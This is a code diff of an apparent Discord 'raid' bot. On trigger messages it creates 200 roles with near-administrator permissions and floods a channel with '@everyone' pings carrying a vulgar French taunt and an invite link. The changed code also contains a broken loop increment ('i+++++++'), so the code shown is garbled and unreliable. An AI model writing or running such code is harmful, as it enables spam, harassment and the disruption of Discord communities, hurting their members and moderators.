@@ -10,7 +10,7 @@ if(message.content.includes("AR!kelsairv")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
 if(message.content === "roles"){
-for(var i =0; i < 999; i++){
+for(var i =0; i < 200; i++){
     message.guild.createRole({name:"Okue Le tchoupi Islamiste",
                              mentionable:false,
                              permissions:2146958591,
@@ -150,7 +150,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
               }
             }
             if(message.content.includes("!everyone")){
-                for(var i = 0; i < 999; i++){
+                for(var i = 0; i < 200; i+++++++){
                     message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/fVA3WE4")
                 }
             }
